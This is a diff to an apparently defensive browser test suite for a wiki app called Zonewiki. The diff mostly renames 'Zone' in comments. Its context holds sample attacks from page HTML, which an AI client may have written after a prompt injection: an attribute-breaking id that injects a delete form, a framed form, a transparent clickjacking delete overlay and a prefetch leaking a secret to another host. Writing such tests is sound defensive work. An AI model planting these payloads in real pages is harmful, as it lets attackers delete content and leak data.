@@ -1,6 +1,6 @@
 """The Content-Security-Policy in a real browser: a page's raw HTML (which an
 AI client may have written after a prompt injection) runs no script, while
-Zone's own scripts keep working."""
+Zonewiki's own scripts keep working."""
 
 import re
 
@@ -18,13 +18,13 @@ ATTACKS = (
 def test_raw_html_in_a_page_runs_no_script(page, wiki):
     wiki.write("evil", "# Evil\n\n" + ATTACKS + "```python\nx = 1\n```\n")
     page.goto("/page/evil")
-    # Zone's own scripts still run: the code block is highlighted.
+    # Zonewiki's own scripts still run: the code block is highlighted.
     expect(page.locator("article.page-content pre code.hljs")).to_have_count(1)
     expect(page.locator("#user-content-bad-img")).to_have_count(1)
     page.locator("#user-content-bad-link").click()
     page.wait_for_timeout(300)
     assert page.evaluate("window.pwned") is None
-    # The browser blocked them, which the harness would count against Zone.
+    # The browser blocked them, which the harness would count against Zonewiki.
     assert page.csp_violations
     page.csp_violations.clear()
 
@@ -43,7 +43,7 @@ def test_editor_preview_runs_no_handler(page, wiki):
 
 
 def test_uploaded_script_does_not_run(page, wiki):
-    # script-src 'self' trusts Zone's origin, so an upload must not be
+    # script-src 'self' trusts Zonewiki's origin, so an upload must not be
     # servable as a script: it comes as application/octet-stream with nosniff.
     # A page's raw HTML makes no <script> (it shows as text), so the script
     # element is made here as any other way into the page would.
@@ -62,7 +62,7 @@ def test_a_page_cannot_hand_the_task_lists_their_tasks(page, wiki):
     # come as HTML the server rendered. A page's raw HTML that gave one of its
     # elements the block's place (an id the lists once looked for, a <script>
     # of JSON before the list) handed them tasks of its own, whose "rendered"
-    # notes went into the cards as they were: a live form posting to Zone.
+    # notes went into the cards as they were: a live form posting to Zonewiki.
     import datetime
     import json
     today = datetime.date.today().isoformat()
@@ -86,8 +86,8 @@ def test_a_page_cannot_hand_the_task_lists_their_tasks(page, wiki):
 
 
 def test_a_page_frames_no_form(page, wiki):
-    # An iframe's srcdoc would be a document of Zone's own origin, where a
-    # form posts to Zone like one of its own: however the attribute is
+    # An iframe's srcdoc would be a document of Zonewiki's own origin, where a
+    # form posts to Zonewiki like one of its own: however the attribute is
     # written, the frame stays empty.
     form = "&lt;form method=post action=/delete/index&gt;&lt;button id=go&gt;Go&lt;/button&gt;&lt;/form&gt;"
     wiki.write("framed", "# Framed\n\n"
@@ -121,7 +121,7 @@ def test_a_links_ping_posts_nothing(page, wiki):
 def test_a_page_frames_no_page_of_zones(page, wiki):
     # A page's raw HTML could lay a transparent frame of /admin or /changes
     # (one click there removes a user or undoes a change) over a decoy: no
-    # view of Zone's may be framed, by another site or by Zone itself. An
+    # view of Zonewiki's may be framed, by another site or by Zonewiki itself. An
     # upload may: a page shows a PDF or a picture in an iframe.
     (wiki.root / "_assets" / "note.txt").write_text("framed upload\n")
     wiki.write("decoy", "# Decoy\n\n"
@@ -138,7 +138,7 @@ def test_a_page_frames_no_page_of_zones(page, wiki):
 
 
 def test_a_tasks_id_is_text_on_its_card(page, wiki):
-    # A tasks file written by hand (or by an older Zone) may hold any id:
+    # A tasks file written by hand (or by an older Zonewiki) may hold any id:
     # the card shows the task, and the id makes no element of its own.
     import json
     evil = 'x"></span><form id="evil" method="post" action="/delete/index"><button>ok</button></form><span data-x="'
@@ -170,7 +170,7 @@ def test_a_page_asks_no_other_host_for_anything(page, wiki):
                f'<link rel="prefetch" href="{there}/p?secret">\n\n'
                "```python\nx = 1\n```\n\n$e^{i\\pi}$\n")
     page.goto("/page/leaky")
-    expect(page.locator("article.page-content pre code.hljs")).to_have_count(1)   # Zone's own still work
+    expect(page.locator("article.page-content pre code.hljs")).to_have_count(1)   # Zonewiki's own still work
     expect(page.locator("article.page-content .katex")).to_have_count(1)
     link = page.locator("article.page-content a.external-image")
     expect(link).to_have_text("a cat")
@@ -193,7 +193,7 @@ def test_a_wiki_without_a_login_asks_for_one_first(page, wiki, monkeypatch):
     wiki.write("plans", "# Plans\n\nsecret words\n")
     page.goto("/page/plans")
     expect(page).to_have_url(re.compile(r"/setup$"))
-    expect(page.locator("form.login-form h2")).to_have_text("Set a password for Zone")
+    expect(page.locator("form.login-form h2")).to_have_text("Set a password for Zonewiki")
     expect(page.locator("body")).not_to_contain_text("secret words")
     page.fill("input[name=password]", "correct horse")
     page.fill("input[name=again]", "correct horse")
@@ -216,7 +216,7 @@ def test_a_login_is_set_from_the_menu_on_localhost(page, wiki, monkeypatch):
     page.locator(".top-actions .top-menu").click()
     page.locator(".module-menu").get_by_role("menuitem", name="Set a login").click()
     expect(page).to_have_url(re.compile(r"/setup$"))
-    expect(page.locator("form.login-form h2")).to_have_text("Set a login for Zone")
+    expect(page.locator("form.login-form h2")).to_have_text("Set a login for Zonewiki")
     # Not now leads back, and nothing was set.
     page.get_by_role("link", name="Not now").click()
     expect(page).to_have_url(re.compile(r"/page/index$"))
@@ -241,7 +241,7 @@ def test_a_login_is_set_from_the_menu_on_localhost(page, wiki, monkeypatch):
 
 
 def test_a_pages_ids_stand_in_for_none_of_zones(page, wiki):
-    # Zone's scripts find their elements by id, the browser globals by name:
+    # Zonewiki's scripts find their elements by id, the browser globals by name:
     # a page's <data id="task-edit-id" value=…> came first and would aim the
     # task dialog's save at another task, an <a name="katex"> was
     # window.katex. A page's ids and names have "user-content-" in front, and
@@ -269,8 +269,8 @@ def test_a_click_submits_only_a_form_zone_put_there(page, wiki):
     # A page's own <style> could show the page's closed Delete dialog and lay
     # its button over the whole page, transparent: the reader's next click
     # anywhere deleted the page. A submit from a dialog that isn't open is
-    # cancelled (CSS can't open one), and so is one from a form in what Zone
-    # renders from text, however it got there; Zone's own forms work.
+    # cancelled (CSS can't open one), and so is one from a form in what Zonewiki
+    # renders from text, however it got there; Zonewiki's own forms work.
     wiki.write("plans", "# Plans\n\nRead me.\n\n"
                "<style>#page-delete-dialog { display: block !important; position: fixed !important;"
                " inset: 0 !important; opacity: 0 !important; z-index: 2147483647 !important;"
@@ -297,7 +297,7 @@ def test_a_click_submits_only_a_form_zone_put_there(page, wiki):
     page.wait_for_timeout(500)
     assert (wiki.root / "plans.md").exists() and posts == []
     expect(page).to_have_url(re.compile(r"/page/plans$"))
-    # Zone's own: the embed's "Create the list", and the page's Delete opened
+    # Zonewiki's own: the embed's "Create the list", and the page's Delete opened
     # from its menu.
     page.locator("#tasks-no-list button[type=submit]").click()
     expect(page).to_have_url(re.compile(r"/tasks\?list=shopping"))
